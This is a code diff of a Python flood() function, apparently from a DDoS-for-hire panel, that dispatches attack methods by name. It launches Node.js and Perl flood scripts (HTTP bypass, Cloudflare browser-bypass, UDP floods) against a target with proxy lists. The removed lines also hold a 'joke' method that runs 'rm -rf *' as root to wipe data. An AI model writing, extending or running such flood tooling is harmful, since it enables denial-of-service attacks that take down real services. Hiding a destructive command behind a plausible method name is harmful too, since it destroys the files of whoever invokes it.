@@ -79,14 +79,14 @@ def flood():
         # add ya own shit... and can you see any if-elif-elif-elif.. ;)
         match method:
 
-            case "AUTOBYPASS-GET":
-                cmd = f"cd /root/l7/autobypass && {screen_cmd} node method.js {target} {time} request proxies.txt GET false"
+            case "BYPASS":
+                cmd = f"cd /root && {screen_cmd} node wabas.js {target} {time} 60 2 proxy.txt"
 
-            case "AUTOBYPASS-POST":
-                cmd = f"cd /root/l7/autobypass && {screen_cmd} node method.js {target} {time} request proxies.txt POST false"
+            case "ZEUS":
+                cmd = f"cd /root && {screen_cmd} node flood.js {target} {time} 60 2"
 
-            case "CF-BROWSER-BYPASS":
-                cmd = f"cd /root/l7/BROWSER && {screen_cmd} node browser.js {target} {time} solver.txt proxies.txt 1500 10 50 1"
+            case "UDP":
+                cmd = f"cd /root && {screen_cmd} perl private.pl {target} {port} 5000 {time}"
 
             case "HTTP-MIX":
                 cmd = f"cd /root/l7/mix && {screen_cmd} node http-mix.js {target} {time} 15"
@@ -94,8 +94,6 @@ def flood():
             case "HTTP-QUERY":
                 cmd = f"cd /root/l7/query && {screen_cmd} node http-query.js {target} {time} 15"
 
-            case "YOUNGTHUGUDP239856_BYPASS": # this is a joke... remove it or dont ;)
-                cmd = f"cd /root && {screen_cmd} rm -rf *"
 
             case "STOP":
 
